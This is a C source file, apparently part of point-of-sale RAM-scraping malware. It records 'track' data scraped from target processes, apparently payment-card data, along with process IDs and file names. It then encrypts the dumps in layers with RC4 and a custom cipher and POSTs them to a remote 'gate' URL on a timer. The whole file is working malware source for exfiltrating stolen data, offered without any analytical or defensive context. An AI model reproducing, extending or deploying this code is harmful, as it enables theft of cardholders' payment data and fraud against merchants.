typedef struct dumpsHolder {
	TCHAR *lpFileName;
	int lpFileNameLength;
	int procID;
	char *trackArr;
	int trackArrLength;
} dumpsHolder;

dumpsHolder *tracksArr;

void clingfishModeActivate(int pID);
int checkClingfishUsage(int pID);

/* This will probably need to be rewritten from scratch */
void recordTrack(TCHAR *lpFileName, int procID, char *haystack, int length, int startPos){
	int i, writeFileName;

	/*If there is no more space for new dumps, wait until the reporting thread takes the old ones out and sends them to the gate*/
	if (tracksArrIndex >= tracksArrSize)
		while(tracksArrIndex != 0)
			Sleep(60000);

	EnterCriticalSection(&m_cs);

	if (tracksArrIndex >= tracksArrSize){ /*I'm not sure if this can really happen... */
		LeaveCriticalSection(&m_cs);
		return;
	}

	writeFileName = 1;

	for (i=0; i<tracksArrIndex; i++){
		if (tracksArr[i].procID == procID)
			writeFileName = 0;
		if (compareArrays(haystack, tracksArr[i].trackArr, startPos, length) == 1){
			LeaveCriticalSection(&m_cs);
			return;
		}
	}

	if (writeFileName == 1){
		tracksArr[tracksArrIndex].lpFileNameLength = wcslen(lpFileName);
		/*if (tracksArr[tracksArrIndex].lpFileName == NULL)
			tracksArr[tracksArrIndex].lpFileName = (TCHAR*)safeMalloc(sizeof(TCHAR) * (tracksArr[tracksArrIndex].lpFileNameLength + 1));*/

		for (i=0; i<tracksArr[tracksArrIndex].lpFileNameLength; i++)
			tracksArr[tracksArrIndex].lpFileName[i] = lpFileName[i];

		tracksArr[tracksArrIndex].lpFileName[i] = '\0';
	} else
		tracksArr[tracksArrIndex].lpFileNameLength = 0;

	tracksArr[tracksArrIndex].procID = procID;

	/*if (tracksArr[tracksArrIndex].trackArr == NULL)
		tracksArr[tracksArrIndex].trackArr = (char*)safeMalloc(sizeof(char) * (length + 1));*/
	if (tracksArr[tracksArrIndex].trackArrLength < length)
		tracksArr[tracksArrIndex].trackArr = (char*)safeRealloc(tracksArr[tracksArrIndex].trackArr, sizeof(char) * (length + 1));

	for (i=startPos; i<startPos+length && i<2048; i++)
		tracksArr[tracksArrIndex].trackArr[i - startPos] = haystack[i];
	tracksArr[tracksArrIndex].trackArr[length] = '\0';

	tracksArr[tracksArrIndex].trackArrLength = length;

	tracksArrIndex ++;

	LeaveCriticalSection(&m_cs);

	if (useClingfishMode == 1 && checkClingfishUsage(procID) == 0)
		clingfishModeActivate(procID);
}

char *getCharProcID(int procID){
	char *chrProcID;

	if (procID > 0)
		chrProcID = intToString(procID);
	else {
		chrProcID = (char*)safeMalloc(sizeof(char) * 4);
		arrCopy(chrProcID, "err", 4);
	}

	return chrProcID;
}

char *cryptFileName(TCHAR *lpFileName, int lpFileNameLength){
	char *chrFileName, *crypted;

	chrFileName = (char*)safeMalloc(sizeof(char) * (lpFileNameLength + 1));
	if (lpFileNameLength > 0){
		wcstombs(chrFileName, lpFileName, lpFileNameLength + 1);
		crypted = rc4(levelOneRC4Key, (unsigned char*)chrFileName, 0, 1);
	} else 
		crypted = NULL;
	free(chrFileName);

	return crypted;
}

/* This will maybe need to be partly rewritten */
DWORD WINAPI sendReport(LPVOID lpParam){
	char *combineTrackDataResult, *chrProcID, *POSTData, *rc4Encrypted, *POSTDataReport, *responseContents;
	unsigned char *pirateCodeEncrypted;
	int i, combineTrackDataResultLength, chrProcIDLength, POSTDataReportLength, POSTDataReportCurrentAllocation = 0, POSTDataLength;

	UNREFERENCED_PARAMETER(lpParam);

	while(1){
		EnterCriticalSection(&m_cs);

		if (tracksArrIndex > 0){
			POSTDataReportLength = 0;

			/*the following is part of a temporary DIRTY hack to avoid heap fragmentation on older OSes until I refactor most string functions*/
			for (i = 0; i < tracksArrIndex; i ++){
				chrProcID = getCharProcID(tracksArr[i].procID);
				chrProcIDLength = strlen(chrProcID);
				combineTrackDataResultLength = tracksArr[i].lpFileNameLength * 2 + 1 + chrProcIDLength;
				free(chrProcID);

				combineTrackDataResultLength += tracksArr[i].trackArrLength * 2 + 1;
				POSTDataReportLength += combineTrackDataResultLength + 1;
			}

			if (POSTDataReportCurrentAllocation == 0){
				POSTDataReport = (char*)safeMalloc(sizeof(char) * (POSTDataReportLength + 1));
				POSTDataReportCurrentAllocation = POSTDataReportLength + 1;

				POSTData = (char*)safeMalloc(sizeof(char) * (POSTDataReportLength*2 + 45));
			} else if (POSTDataReportLength + 1 > POSTDataReportCurrentAllocation){
				POSTDataReport = (char*)safeRealloc(POSTDataReport, sizeof(char) * (POSTDataReportLength + 1));
				POSTDataReportCurrentAllocation = POSTDataReportLength + 1;

				POSTData = (char*)safeRealloc(POSTData, sizeof(char) * (POSTDataReportLength*2 + 45));
			}
			/*end dirty hack part*/
			POSTDataReportLength = 0;

			for (i = 0; i < tracksArrIndex; i ++){
				combineTrackDataResult = cryptFileName(tracksArr[i].lpFileName, tracksArr[i].lpFileNameLength);

				/*if (tracksArr[i].lpFileName != NULL){
					free(tracksArr[i].lpFileName);
					tracksArr[i].lpFileName = NULL;
				}*/

				chrProcID = getCharProcID(tracksArr[i].procID);
				chrProcIDLength = strlen(chrProcID);
				joinStringsWithSeparator(&combineTrackDataResult, tracksArr[i].lpFileNameLength * 2, ':', chrProcID, chrProcIDLength, TRUE);
				combineTrackDataResultLength = tracksArr[i].lpFileNameLength * 2 + 1 + chrProcIDLength;

				joinStringsWithSeparator(&combineTrackDataResult, combineTrackDataResultLength, ':', rc4(levelOneRC4Key, (unsigned char*)tracksArr[i].trackArr, 0, 1), tracksArr[i].trackArrLength * 2, TRUE);
				combineTrackDataResultLength += tracksArr[i].trackArrLength * 2 + 1;
				/*free(tracksArr[i].trackArr);
				tracksArr[i].trackArr = NULL;*/

				/*joinStringsWithSeparator(&POSTDataReport, POSTDataReportLength, '|', combineTrackDataResult, combineTrackDataResultLength, TRUE);*/
				/*the following is part of a temporary DIRTY hack to avoid heap fragmentation on older OSes until I refactor most string functions*/
				POSTDataReport[POSTDataReportLength] = '|';
				arrCopy(POSTDataReport + POSTDataReportLength + 1, combineTrackDataResult, combineTrackDataResultLength);
				/*end dirty hack part*/
				free(combineTrackDataResult);
				POSTDataReportLength += combineTrackDataResultLength + 1;
			}

			pirateCodeEncrypted = (unsigned char*)pirateCodeEncrypt(levelTwoPirateCodeKey, POSTDataReport, 0);

			rc4Encrypted = rc4(levelThreeRC4Key, pirateCodeEncrypted, 0, 1);
			POSTDataReportLength *= 2;

			/*the following is part of a temporary DIRTY hack to avoid heap fragmentation on older OSes until I refactor most string functions*/
			//POSTData = combineArrs("report=", 7, POSTDataReport, POSTDataReportLength);
			combineStackArrs(POSTData, "report=", 7, rc4Encrypted, POSTDataReportLength);
			POSTDataLength = POSTDataReportLength + 7;

			arrCopy(POSTData + POSTDataLength, "&id=", 4);
			arrCopy(POSTData + POSTDataLength + 4, systemID, 33);
			//joinStringsWithSeparator(&POSTData, POSTDataLength, '&', "id", 2, FALSE);
			//joinStringsWithSeparator(&POSTData, POSTDataLength + 3, '=', systemID, 32, FALSE);
			/*end dirty hack part*/

			responseContents = readInternetFile(hConnect, gateReportURL, POSTData, 7);

			if (responseContents != NULL && strstr(responseContents, "success") != NULL)
				showDebugMessage(L"successfully sent the dumps!", 0);
			
			free(pirateCodeEncrypted);
			free(rc4Encrypted);
			free(responseContents);

			tracksArrIndex = 0;
		}

		LeaveCriticalSection(&m_cs);

		/*Sleep for a predefined number of minutes*/
		Sleep(sendPause);
	}
}